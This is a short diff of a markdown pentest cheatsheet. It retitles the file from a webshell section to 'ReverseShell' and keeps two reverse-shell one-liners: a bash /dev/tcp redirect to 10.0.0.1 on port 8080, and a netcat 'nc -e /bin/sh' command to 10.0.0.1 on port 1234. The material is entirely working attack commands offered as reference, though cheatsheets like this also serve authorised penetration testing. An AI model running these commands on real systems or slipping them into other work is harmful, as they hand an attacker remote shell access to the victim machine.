@@ -1,14 +1,12 @@
-# Pentest - cheatsheet
+# ReverseShell
 
-## Webshells
-
-### Bash
+## Bash
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-### netcat
+## netcat
 
 ```bash
 nc -e /bin/sh 10.0.0.1 1234
